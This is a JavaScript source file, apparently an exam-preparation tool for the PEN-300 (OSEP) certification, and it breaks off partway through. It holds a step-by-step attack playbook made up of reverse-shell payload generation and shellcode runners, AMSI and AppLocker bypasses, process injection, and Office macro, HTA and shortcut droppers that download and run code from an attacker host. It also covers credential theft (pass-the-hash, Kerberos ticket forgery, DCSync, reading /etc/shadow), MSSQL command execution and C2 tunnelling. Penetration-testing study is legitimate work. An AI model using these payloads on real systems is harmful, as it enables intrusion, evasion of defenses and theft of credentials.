const{useState,useEffect,useRef}=window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSEP AUTOPILOT v1 — PEN-300 Decision Engine 2026
// Evasion Techniques & Breaching Defenses
// 47h45m exam | 100pts (10 flags) or secret.txt | 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── PHASE 0: RECON & SITUATIONAL AWARENESS ───
const RECON_CHAIN=[
{phase:"0. Initial Recon & Network Mapping",desc:"Map the corporate network. Identify targets, DCs, segmentation.",steps:[
{action:"Network sweep & port scan",cmd:(v)=>`# Quick sweep:\nnmap -sn ${v.subnet||"10.10.10.0/24"} -oG sweep.txt\ngrep Up sweep.txt | cut -d' ' -f2 > live_hosts.txt\n\n# Port scan live hosts:\nnmap -sV -sC -p- --min-rate=1000 -oA full_scan -iL live_hosts.txt\n\n# Quick top ports:\nnmap -sV --top-ports 100 -iL live_hosts.txt -oA quick_scan`,check:"Live hosts? Open ports? Services?",critical:true},
{action:"Identify Domain Controllers",cmd:(v)=>`# DNS lookup:\nnslookup -type=srv _ldap._tcp.dc._msdcs.${v.domain||"corp.local"}\n\n# Nmap:\nnmap -p 88,389,636,445,3268 ${v.subnet||"10.10.10.0/24"} --open\n\n# netexec:\nnetexec smb ${v.subnet||"10.10.10.0/24"} | grep -i DC`,check:"DC IPs identified?",critical:true},
{action:"Enumerate AD with domain creds",cmd:(v)=>`# BloodHound collection:\nbloodhound-python -u '${v.user||"user"}' -p '${v.pass||"pass"}' -d '${v.domain||"corp.local"}' -ns ${v.dc||"DC_IP"} -c all\n\n# netexec enum:\nnetexec smb ${v.dc||"DC_IP"} -u '${v.user||"user"}' -p '${v.pass||"pass"}' -d '${v.domain||"corp.local"}' --users\nnetexec smb ${v.dc||"DC_IP"} -u '${v.user||"user"}' -p '${v.pass||"pass"}' -d '${v.domain||"corp.local"}' --groups`,check:"BloodHound paths? Users? Groups?",critical:true},
{action:"Identify defenses in place",cmd:(v)=>`# Check AV/EDR from compromised host:\nGet-MpComputerStatus\nGet-MpPreference | Select -Expand ExclusionPath\nsc query windefend\ntasklist /v | findstr /i "defender cylance carbon crowd sentinel sophos"`,check:"What AV/EDR? What's excluded?"},
{action:"Check AppLocker / WDAC policies",cmd:(v)=>`Get-AppLockerPolicy -Effective | Select -Expand RuleCollections\nGet-CimInstance -ClassName MSFT_MpPreference -Namespace root/Microsoft/Windows/Defender\n\n# Check constrained language mode:\n$ExecutionContext.SessionState.LanguageMode`,check:"AppLocker rules? CLM active?"},
]},
];

// ─── PHASE 1: AV/EDR EVASION ───
const EVASION_CHAIN=[
{phase:"1. AV Evasion — Payload Crafting",desc:"Craft payloads that bypass AV signature + heuristic detection.",steps:[
{action:"msfvenom with encoding",cmd:(v)=>`# Stageless (preferred for evasion):\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f exe -o shell.exe\n\n# With encoding:\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -e x64/xor_dynamic -i 5 -f exe -o encoded.exe\n\n# Raw shellcode for custom loaders:\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f csharp`,check:"Base payload generated?",critical:true},
{action:"C# shellcode runner (Process.Start)",cmd:(v)=>`// compile: csc /unsafe /out:runner.exe runner.cs\nusing System;\nusing System.Runtime.InteropServices;\nclass Program {\n  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p,uint s,uint a,uint pr);\n  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);\n  [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h,uint m);\n  static void Main() {\n    byte[] buf = new byte[] { /* msfvenom -f csharp shellcode */ };\n    IntPtr addr = VirtualAlloc(IntPtr.Zero,(uint)buf.Length,0x3000,0x40);\n    Marshal.Copy(buf,0,addr,buf.Length);\n    IntPtr hThread = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,IntPtr.Zero);\n    WaitForSingleObject(hThread,0xFFFFFFFF);\n  }\n}`,check:"Compiles? Runs without detection?",critical:true},
{action:"XOR/AES encryption of shellcode",cmd:(v)=>`# Python XOR encryptor:\nimport sys\nkey = 0xfa\nwith open('shellcode.bin','rb') as f: buf = f.read()\nenc = bytes([b ^ key for b in buf])\nprint('byte[] buf = new byte[] {' + ','.join([f'0x{b:02x}' for b in enc]) + '};')\n\n# C# AES decryptor at runtime:\n// Aes aes = Aes.Create();\n// aes.Key = Convert.FromBase64String("KEY");\n// aes.IV = Convert.FromBase64String("IV");\n// byte[] dec = aes.CreateDecryptor().TransformFinalBlock(enc,0,enc.Length);`,check:"Encrypted payload? Decrypts at runtime?"},
{action:"Signed binary proxy (LOLBins)",cmd:(v)=>`# MSBuild:\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml\n\n# InstallUtil:\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false payload.exe\n\n# Regsvr32:\nregsvr32 /s /n /u /i:http://${v.lhost||"LHOST"}/payload.sct scrobj.dll\n\n# Mshta:\nmshta http://${v.lhost||"LHOST"}/payload.hta\n\n# Rundll32:\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")`,check:"LOLBin executes payload?"},
{action:"Timestomping & metadata cleanup",cmd:(v)=>`# PowerShell timestomp:\n$file = Get-Item payload.exe\n$file.CreationTime = Get-Date "01/01/2022"\n$file.LastWriteTime = Get-Date "01/01/2022"\n$file.LastAccessTime = Get-Date "01/01/2022"\n\n# Or copy timestamps from legit file:\n$ref = Get-Item C:\\Windows\\System32\\notepad.exe\n$file.CreationTime = $ref.CreationTime`,check:"Timestamps look legitimate?"},
]},
{phase:"2. AMSI Bypass",desc:"Bypass Anti-Malware Scan Interface for PowerShell/JScript execution.",steps:[
{action:"AMSI Reflection bypass (PowerShell)",cmd:(v)=>`# Classic reflection bypass:\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$f=$a.GetField('amsiInitFailed','NonPublic,Static')\n$f.SetValue($null,$true)\n\n# Verify: AmsiUtils is bypassed\n'Invoke-Mimikatz'  # Should not be flagged`,check:"AMSI reports as failed?",critical:true},
{action:"AMSI Patch (Memory patching)",cmd:(v)=>`# C# AMSI patch:\n// Overwrite AmsiScanBuffer with ret 0\nvar amsi = LoadLibrary("amsi.dll");\nvar addr = GetProcAddress(amsi, "AmsiScanBuffer");\nVirtualProtect(addr, 5, 0x40, out uint old);\nMarshal.WriteByte(addr, 0xB8);     // mov eax,\nMarshal.WriteInt32(addr+1, 0x0);    // 0 (AMSI_RESULT_CLEAN)\nMarshal.WriteByte(addr+5, 0xC3);    // ret\nVirtualProtect(addr, 5, old, out _);`,check:"AmsiScanBuffer patched?"},
{action:"AMSI bypass via string obfuscation",cmd:(v)=>`# Concatenation bypass:\n$a = 'Am'+'si'+'Ut'+'ils'\n$b = 'am'+'si'+'In'+'it'+'Fa'+'il'+'ed'\n[Ref].Assembly.GetType("System.Management.Automation.$a").GetField($b,'NonPublic,Static').SetValue($null,$true)\n\n# Base64 encoded:\n[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("BASE64_OF_BYPASS"))`,check:"Obfuscated version works?"},
{action:"JScript AMSI bypass",cmd:(v)=>`// WScript shell AMSI bypass:\nvar sh = new ActiveXObject('WScript.Shell');\nvar key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";\ntry { sh.RegWrite(key, 0, "REG_DWORD"); } catch(e) {}\n\n// Or via COM object manipulation in JScript`,check:"JScript AMSI bypassed?"},
]},
{phase:"3. AppLocker / CLM Bypass",desc:"Bypass application whitelisting and Constrained Language Mode.",steps:[
{action:"Check current restrictions",cmd:(v)=>`# Check language mode:\n$ExecutionContext.SessionState.LanguageMode\n\n# Check AppLocker rules:\nGet-AppLockerPolicy -Effective -XML | Set-Content applocker.xml\nGet-AppLockerPolicy -Effective | Select -Expand RuleCollections`,check:"FullLanguage or ConstrainedLanguage?",critical:true},
{action:"Trusted folder bypass",cmd:(v)=>`# AppLocker often allows:\nC:\\Windows\\Tasks\\\nC:\\Windows\\Temp\\\nC:\\Windows\\tracing\\\nC:\\Windows\\Registration\\CRMLog\\\nC:\\Windows\\System32\\FxsTmp\\\nC:\\Windows\\System32\\com\\dmp\\\nC:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\\nC:\\Windows\\System32\\spool\\drivers\\color\\\n\n# Copy and execute from trusted path:\ncopy payload.exe C:\\Windows\\Tasks\\payload.exe\nC:\\Windows\\Tasks\\payload.exe`,check:"Writable trusted paths found?",critical:true},
{action:"MSBuild inline task bypass",cmd:(v)=>`# payload.xml (C# inline task):\n<!-- MSBuild bypasses AppLocker -->\n<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n  <Target Name="Run"><ClassExample /></Target>\n  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"\n    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">\n    <Task><Code Type="Class" Language="cs"><![CDATA[\n      // Your C# shellcode runner here\n    ]]></Code></Task>\n  </UsingTask>\n</Project>\n\n# Execute:\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml`,check:"MSBuild runs C#?"},
{action:"InstallUtil bypass",cmd:(v)=>`// C# with Installer class:\n[System.ComponentModel.RunInstaller(true)]\npublic class Bypass : System.Configuration.Install.Installer {\n  public override void Uninstall(IDictionary state) {\n    // shellcode runner here\n  }\n}\n\n// Execute:\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe`,check:"InstallUtil bypasses AppLocker?"},
{action:"PowerShell CLM bypass via runspace",cmd:(v)=>`// C# PowerShell runspace (runs in FullLanguage):\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nRunspace rs = RunspaceFactory.CreateRunspace();\nrs.Open();\nPowerShell ps = PowerShell.Create();\nps.Runspace = rs;\nps.AddScript("whoami; $ExecutionContext.SessionState.LanguageMode");\nforeach(var r in ps.Invoke()) Console.WriteLine(r);`,check:"C# runspace = FullLanguage mode?"},
]},
];

// ─── PHASE 2: PROCESS INJECTION ───
const INJECTION_CHAIN=[
{phase:"4. Process Injection Techniques",desc:"Inject code into legitimate processes to evade detection.",steps:[
{action:"Classic DLL Injection",cmd:(v)=>`// 1. OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread\n// Target: explorer.exe, svchost.exe, notepad.exe\n\n// C# DLL Injection:\nProcess target = Process.GetProcessesByName("explorer")[0];\nIntPtr hProc = OpenProcess(0x001F0FFF, false, target.Id);\nIntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)dllPath.Length, 0x3000, 0x04);\nWriteProcessMemory(hProc, addr, Encoding.Default.GetBytes(dllPath), (uint)dllPath.Length, out _);\nIntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");\nCreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);`,check:"DLL loaded in target process?",critical:true},
{action:"Reflective DLL Injection",cmd:(v)=>`# No file on disk — DLL loaded from memory\n# Use sRDI (shellcode Reflective DLL Injection):\n# https://github.com/monoxgas/sRDI\n\n# Convert DLL to position-independent shellcode:\npython3 ConvertToShellcode.py -f MyDll.dll -o reflective.bin\n\n# Inject the shellcode into target process memory\n# Uses custom PE loader, no LoadLibrary call`,check:"DLL loaded without touching disk?"},
{action:"Process Hollowing",cmd:(v)=>`// 1. Create suspended process (svchost.exe)\n// 2. Unmap original image\n// 3. Allocate + write malicious PE\n// 4. Set thread context to new entry point\n// 5. Resume thread\n\n// Key APIs:\nCreateProcess(... CREATE_SUSPENDED ...)\nNtUnmapViewOfSection(hProc, baseAddr)\nVirtualAllocEx(hProc, desiredBase, imageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\nWriteProcessMemory(hProc, remoteBase, peBytes, peSize, ...)\nSetThreadContext(hThread, &ctx)  // Set EIP/RIP\nResumeThread(hThread)`,check:"Hollowed process running payload?",critical:true},
{action:"Shellcode injection (NtCreateSection)",cmd:(v)=>`// Syscall-based injection (harder for EDR to hook):\n// 1. NtCreateSection (create shared memory)\n// 2. NtMapViewOfSection (map into current + target)\n// 3. Copy shellcode to mapped section\n// 4. NtCreateThreadEx / QueueUserAPC\n\n// Direct syscalls avoid ntdll hooks:\n// Use SysWhispers2/3 or HellsGate for dynamic syscall IDs`,check:"Syscall injection works?"},
{action:"Parent PID Spoofing",cmd:(v)=>`// Make payload appear as child of trusted process:\nvar si = new STARTUPINFOEX();\nvar lpVal = Marshal.AllocHGlobal(IntPtr.Size);\nMarshal.WriteIntPtr(lpVal, parentHandle); // e.g., explorer.exe handle\nUpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpVal, ...);\nCreateProcess(null, "cmd.exe", ..., EXTENDED_STARTUPINFO_PRESENT, ..., ref si, ...);`,check:"Process tree looks legitimate?"},
]},
];

// ─── PHASE 3: CLIENT-SIDE ATTACKS ───
const CLIENT_CHAIN=[
{phase:"5. Office Macro Attacks",desc:"Phishing with malicious Office documents.",steps:[
{action:"VBA macro shellcode runner",cmd:(v)=>`' Word/Excel VBA macro:\nPrivate Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAllocType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttrs As Long, ByVal dwStackSize As Long, ByVal lpStartAddr As LongPtr, ByVal lpParam As LongPtr, ByVal dwCreateFlags As Long, ByRef lpThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\n\nSub AutoOpen()\n  Dim buf As Variant\n  buf = Array(232, 130, ...) ' msfvenom -f vbapplication shellcode\n  Dim addr As LongPtr\n  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n  Dim i As Long\n  For i = LBound(buf) To UBound(buf)\n    Dim b As Byte: b = buf(i)\n    RtlMoveMemory addr + i, b, 1\n  Next\n  CreateThread 0, 0, addr, 0, 0, 0\nEnd Sub`,check:"Macro executes shellcode?",critical:true},
{action:"VBA with AMSI bypass",cmd:(v)=>`' Bypass AMSI before running shellcode:\nPrivate Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\nPrivate Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr\nPrivate Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flNewProt As Long, ByRef lpflOldProt As Long) As Long\n\nSub AmsiBypass()\n  Dim hAmsi As LongPtr: hAmsi = LoadLibrary("amsi.dll")\n  Dim addr As LongPtr: addr = GetProcAddress(hAmsi, "AmsiScanBuffer")\n  Dim oldP As Long: VirtualProtect addr, 6, &H40, oldP\n  ' Patch with: mov eax, 0; ret (xB8 x00 x00 x00 x00 xC3)\nEnd Sub`,check:"AMSI bypassed in VBA?"},
{action:"HTA (HTML Application) payload",cmd:(v)=>`<html><head><script language="VBScript">\nDim sh: Set sh = CreateObject("WScript.Shell")\nsh.Run "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://${v.lhost||"LHOST"}/payload.ps1')""",,False\n</script></head></html>\n\n# Serve: python3 -m http.server 80\n# Trigger: mshta http://${v.lhost||"LHOST"}/payload.hta`,check:"HTA downloads + executes?"},
{action:"JScript payload (.js)",cmd:(v)=>`// File: payload.js\nvar sh = new ActiveXObject("WScript.Shell");\nvar cmd = "powershell -ep bypass -w hidden -enc BASE64_PAYLOAD";\nsh.Run(cmd, 0, false);\n\n// Or DotNetToJScript for in-memory execution:\n// Converts .NET assembly to JScript for fileless execution`,check:"JScript runs payload?"},
]},
{phase:"6. Windows Library Files & Shortcuts",desc:"Weaponize .lnk and .library-ms files for initial access.",steps:[
{action:"Malicious .lnk shortcut",cmd:(v)=>`# Create shortcut that runs PowerShell:\n$WshShell = New-Object -ComObject WScript.Shell\n$lnk = $WshShell.CreateShortcut("$env:TEMP\\Resume.lnk")\n$lnk.TargetPath = "C:\\Windows\\System32\\cmd.exe"\n$lnk.Arguments = "/c powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://${v.lhost||"LHOST"}/payload.ps1')"\n$lnk.IconLocation = "C:\\Windows\\System32\\shell32.dll,1"\n$lnk.Save()`,check:"LNK runs hidden command?"},
{action:"Library-ms file (WebDAV)",cmd:(v)=>`<!-- config.library-ms -->\n<?xml version="1.0" encoding="UTF-8"?>\n<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n  <searchConnectorDescriptionList>\n    <searchConnectorDescription>\n      <simpleLocation>\n        <url>http://${v.lhost||"LHOST"}/webdav</url>\n      </simpleLocation>\n    </searchConnectorDescription>\n  </searchConnectorDescriptionList>\n</libraryDescription>\n\n# Start WebDAV: wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav --auth=anonymous`,check:"Opens remote share? User sees files?"},
]},
];

// ─── PHASE 4: LATERAL MOVEMENT ───
const LATERAL_CHAIN=[
{phase:"7. Windows Lateral Movement",desc:"Move across the network using various protocols.",steps:[
{action:"PsExec / WMIExec / SMBExec",cmd:(v)=>`# Impacket:\nimpacket-psexec '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"}\nimpacket-wmiexec '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"}\nimpacket-smbexec '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"}\nimpacket-atexec '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"}`,check:"Admin access on target?",critical:true},
{action:"Evil-WinRM",cmd:(v)=>`evil-winrm -i ${v.target||"TARGET"} -u '${v.user||"admin"}' -p '${v.pass||"pass"}'\n\n# With hash:\nevil-winrm -i ${v.target||"TARGET"} -u '${v.user||"admin"}' -H NTLM_HASH`,check:"WinRM port 5985 open?"},
{action:"Pass-the-Hash",cmd:(v)=>`# PtH with NTLM hash (no password needed):\nimpacket-psexec -hashes :NTLM_HASH '${v.domain||"corp.local"}/${v.user||"admin"}'@${v.target||"TARGET"}\nnetexec smb ${v.target||"TARGET"} -u '${v.user||"admin"}' -H NTLM_HASH -d '${v.domain||"corp.local"}'\nevil-winrm -i ${v.target||"TARGET"} -u '${v.user||"admin"}' -H NTLM_HASH`,check:"Hash works as credential?",critical:true},
{action:"Overpass-the-Hash (Pass-the-Key)",cmd:(v)=>`# Convert NTLM to Kerberos TGT:\nimpacket-getTGT '${v.domain||"corp.local"}/${v.user||"admin"}' -hashes :NTLM_HASH -dc-ip ${v.dc||"DC_IP"}\nexport KRB5CCNAME=admin.ccache\nimpacket-psexec -k -no-pass '${v.domain||"corp.local"}/${v.user||"admin"}'@${v.target||"TARGET"}\n\n# Rubeus:\nRubeus.exe asktgt /user:${v.user||"admin"} /rc4:NTLM_HASH /ptt`,check:"TGT obtained? Kerberos auth works?"},
{action:"DCOM lateral movement",cmd:(v)=>`# DCOM ShellWindows:\nimpacket-dcomexec -object ShellWindows '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"} "whoami"\n\n# DCOM MMC20.Application:\nimpacket-dcomexec -object MMC20 '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.target||"TARGET"} "whoami"`,check:"DCOM execution works?"},
{action:"WMI lateral movement",cmd:(v)=>`# Remote command via WMI:\nwmic /node:${v.target||"TARGET"} /user:'${v.domain||"corp"}\\${v.user||"admin"}' /password:'${v.pass||"pass"}' process call create "cmd /c whoami > C:\\output.txt"\n\n# PowerShell Invoke-WmiMethod:\nInvoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -enc BASE64" -ComputerName ${v.target||"TARGET"} -Credential $cred`,check:"WMI command executed?"},
]},
{phase:"8. Linux Lateral Movement",desc:"Pivot through Linux hosts via SSH, DevOps tools.",steps:[
{action:"SSH with found credentials",cmd:(v)=>`ssh ${v.user||"user"}@${v.target||"TARGET"}\n\n# SSH with key:\nssh -i id_rsa ${v.user||"user"}@${v.target||"TARGET"}\nchmod 600 id_rsa`,check:"SSH access to Linux hosts?",critical:true},
{action:"SSH tunneling for pivoting",cmd:(v)=>`# Local port forward (access internal service):\nssh -L 8080:INTERNAL_HOST:80 ${v.user||"user"}@${v.target||"TARGET"}\n\n# Dynamic proxy (SOCKS):\nssh -D 1080 ${v.user||"user"}@${v.target||"TARGET"}\nproxychains4 nmap -sT INTERNAL_HOST\n\n# Reverse tunnel:\nssh -R 9999:localhost:445 ${v.user||"user"}@${v.lhost||"LHOST"}`,check:"Tunnel to internal network?"},
{action:"Search for credentials on Linux",cmd:(v)=>`# SSH keys:\nfind / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null\ncat ~/.ssh/known_hosts\ncat ~/.ssh/authorized_keys\n\n# History + configs:\nhistory | grep -iE '(ssh|pass|mysql|psql)'\ncat /etc/shadow\nfind / -name "*.conf" -exec grep -li password {} \\; 2>/dev/null\nenv | grep -i pass`,check:"Keys? Passwords? DB creds?"},
]},
];

// ─── PHASE 5: AD ATTACKS ───
const AD_CHAIN=[
{phase:"9. Kerberos Attacks",desc:"Abuse Kerberos for credential theft and privilege escalation.",steps:[
{action:"Kerberoasting",cmd:(v)=>`impacket-GetUserSPNs '${v.domain||"corp.local"}/${v.user||"user"}:${v.pass||"pass"}' -dc-ip ${v.dc||"DC_IP"} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\n\n# From Windows:\nRubeus.exe kerberoast /outfile:hashes.txt`,check:"Service account hashes cracked?",critical:true},
{action:"AS-REP Roasting",cmd:(v)=>`impacket-GetNPUsers '${v.domain||"corp.local"}/' -usersfile users.txt -dc-ip ${v.dc||"DC_IP"} -request -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`,check:"Accounts without pre-auth?"},
{action:"Silver Ticket",cmd:(v)=>`# Forge TGS with service account NTLM hash:\nimpacket-ticketer -nthash SVC_NTLM_HASH -domain-sid DOMAIN_SID -domain '${v.domain||"corp.local"}' -spn MSSQLSvc/${v.target||"TARGET"}:1433 administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-mssqlclient -k '${v.domain||"corp.local"}/administrator'@${v.target||"TARGET"}`,check:"Silver ticket grants SPN access?"},
{action:"Golden Ticket",cmd:(v)=>`# Need krbtgt NTLM hash (from DCSync):\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain '${v.domain||"corp.local"}' administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec -k -no-pass '${v.domain||"corp.local"}/administrator'@${v.dc||"DC_IP"}`,check:"Golden ticket = domain persistence",critical:true},
{action:"Constrained Delegation abuse",cmd:(v)=>`# Find constrained delegation:\nimpacket-findDelegation '${v.domain||"corp.local"}/${v.user||"user"}:${v.pass||"pass"}' -dc-ip ${v.dc||"DC_IP"}\n\n# S4U2self + S4U2proxy:\nimpacket-getST '${v.domain||"corp.local"}/${v.user||"svc_user"}:${v.pass||"pass"}' -spn cifs/${v.dc||"DC_IP"} -impersonate administrator -dc-ip ${v.dc||"DC_IP"}\nexport KRB5CCNAME=administrator.ccache`,check:"Delegation to DC?"},
{action:"Unconstrained Delegation",cmd:(v)=>`# Find unconstrained delegation:\nbloodhound -> "Find Computers with Unconstrained Delegation"\n\n# Coerce auth + capture TGT:\n# 1. Start Rubeus monitor on unconstrained host:\nRubeus.exe monitor /interval:5\n\n# 2. Coerce DC auth (PrinterBug/PetitPotam):\npython3 printerbug.py '${v.domain||"corp.local"}/${v.user||"user"}:${v.pass||"pass"}'@${v.dc||"DC_IP"} UNCONSTRAINED_HOST\npython3 PetitPotam.py UNCONSTRAINED_HOST ${v.dc||"DC_IP"}`,check:"Captured DC TGT?"},
]},
{phase:"10. Domain Escalation & DCSync",desc:"Escalate to Domain Admin and dump all credentials.",steps:[
{action:"ACL abuse paths (BloodHound)",cmd:(v)=>`# GenericAll on user -> change password\n# GenericAll on group -> add yourself\n# WriteDACL -> grant yourself DCSync\n# ForceChangePassword -> reset password\n\nimpacket-dacledit -action write -rights DCSync -principal '${v.user||"user"}' -target-dn 'DC=${(v.domain||"corp.local").split(".")[0]},DC=${(v.domain||"corp.local").split(".")[1]||"local"}' '${v.domain||"corp.local"}/${v.user||"user"}:${v.pass||"pass"}' -dc-ip ${v.dc||"DC_IP"}`,check:"Can grant yourself DCSync?",critical:true},
{action:"DCSync attack",cmd:(v)=>`# Dump ALL domain hashes:\nimpacket-secretsdump '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.dc||"DC_IP"}\n\n# Dump specific user:\nimpacket-secretsdump '${v.domain||"corp.local"}/${v.user||"admin"}:${v.pass||"pass"}'@${v.dc||"DC_IP"} -just-dc-user administrator\n\n# With hash:\nimpacket-secretsdump -hashes :NTLM_HASH '${v.domain||"corp.local"}/${v.user||"admin"}'@${v.dc||"DC_IP"}`,check:"krbtgt + Administrator hashes?",critical:true},
{action:"Cross-forest trust abuse",cmd:(v)=>`# Enumerate trusts:\nnltest /trusted_domains\nGet-ADTrust -Filter * | Select Name,Direction,TrustType\n\n# Inter-realm TGT:\nimpacket-ticketer -nthash TRUST_KEY -domain-sid CURRENT_SID -domain '${v.domain||"corp.local"}' -extra-sid FOREIGN_DOMAIN_SID-519 administrator\n\n# Access foreign forest:\nimpacket-psexec -k 'foreign.domain/administrator'@FOREIGN_DC`,check:"Cross-forest access?"},
]},
];

// ─── PHASE 6: MSSQL & NETWORK EVASION ───
const MSSQL_CHAIN=[
{phase:"11. MSSQL Exploitation",desc:"Attack SQL Server for lateral movement and RCE.",steps:[
{action:"Find MSSQL servers",cmd:(v)=>`netexec mssql ${v.subnet||"10.10.10.0/24"} -u '${v.user||"user"}' -p '${v.pass||"pass"}' -d '${v.domain||"corp.local"}'\n\n# Nmap:\nnmap -p 1433 ${v.subnet||"10.10.10.0/24"} --open -sV`,check:"MSSQL servers found?",critical:true},
{action:"MSSQL login + xp_cmdshell",cmd:(v)=>`impacket-mssqlclient '${v.domain||"corp.local"}/${v.user||"user"}:${v.pass||"pass"}'@${v.target||"TARGET"}\n\n# Enable xp_cmdshell:\nENABLE_xp_cmdshell\nxp_cmdshell whoami\n\n# Or manual:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n\n# Reverse shell:\nEXEC xp_cmdshell 'powershell -e BASE64_PAYLOAD';`,check:"xp_cmdshell = RCE!",critical:true},
{action:"Linked SQL Servers",cmd:(v)=>`# Find linked servers:\nSELECT * FROM sys.servers;\nSELECT * FROM openquery("LINKED_SRV",'SELECT @@servername');\n\n# Execute on linked server:\nEXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV];\n\n# Double hop:\nEXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINKED2]') AT [LINKED1];`,check:"Linked server RCE?"},
{action:"MSSQL UNC path injection",cmd:(v)=>`# Force MSSQL to auth to your SMB:\nEXEC master.dbo.xp_dirtree '\\\\${v.lhost||"LHOST"}\\share'\n\n# Capture hash with Responder:\nsudo responder -I eth0\n\n# Or Impacket smbserver:\nimpacket-smbserver share /tmp -smb2support`,check:"NTLMv2 hash captured?"},
]},
{phase:"12. Network Filter Bypass",desc:"Bypass proxies, DNS filters, IDS/IPS, and network segmentation.",steps:[
{action:"DNS tunneling",cmd:(v)=>`# dnscat2 server:\nruby dnscat2.rb ${v.domain||"tunnel.domain.com"}\n\n# Client on target:\n./dnscat2 ${v.domain||"tunnel.domain.com"}\n\n# Or iodine:\niodined -f -c -P password 10.0.0.1 ${v.domain||"tunnel.domain.com"}\niodine -f -P password ${v.domain||"tunnel.domain.com"}`,check:"DNS tunnel established?"},
{action:"Domain fronting / CDN abuse",cmd:(v)=>`# Use legitimate CDN domain to hide C2:\n# Host header vs SNI mismatch\n# Azure: azureedge.net\n# CloudFront: cloudfront.net\n# Akamai: akamaiedge.net\n\n# Example:\ncurl -H "Host: your-c2.azureedge.net" https://legitimate-azure-domain.com/beacon`,check:"C2 traffic looks legitimate?"},
{action:"SSH / Chisel tunneling",cmd:(v)=>`# Chisel (HTTP tunnel through proxy):\n# Server:\nchisel server --port 8080 --reverse\n\n# Client:\nchisel client ${v.lhost||"LHOST"}:8080 R:socks\n\n# Then:\nproxychains4 nmap -sT INTERNAL_HOST\nproxychains4 impacket-psexec ...`,check:"Tunnel through firewall?",critical:true},
